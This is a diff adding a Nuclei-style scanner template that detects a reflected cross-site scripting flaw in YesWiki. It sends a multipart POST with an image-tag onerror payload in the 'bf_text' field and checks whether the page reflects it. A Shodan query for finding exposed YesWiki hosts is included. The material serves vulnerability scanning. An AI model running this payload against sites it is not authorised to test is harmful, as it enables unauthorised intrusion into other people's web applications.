@@ -1,0 +1,67 @@
+id: yeswiki-xss2
+
+info:
+  name: YesWiki - Cross-site Scripting
+  author: arafatansari
+  severity: medium
+  description: |
+    YesWiki before 2022-07-07 allows Reflected Cross-site Scripting via the "id" parameter.
+  reference:
+    - https://huntr.dev/bounties/de4db96c-2717-4c0e-b7aa-eee756ca19d3/
+  metadata:
+    shodan-query: http.html:"yeswiki"
+    verified: "true"
+  tags: xss,cve,2022
+
+requests:
+  - raw:
+      - |
+        POST /?BazaR&vue=saisir&action=saisir_fiche&id=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT8dS2PT0WtxACLyu
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_titre"
+
+        blog
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_text"
+
+        "><iMg SrC="x" oNeRRor="alert(1);">
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_description"
+
+        abcd
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="fichierbf_file"; filename=""
+        Content-Type: application/octet-stream
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="antispam"
+
+        1
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="id_typeannonce"
+
+        2
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu--
+
+      - |
+        GET /?BazaR&vue=consulter HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '"><iMg SrC="x" oNeRRor="alert(1);">'
+        condition: and
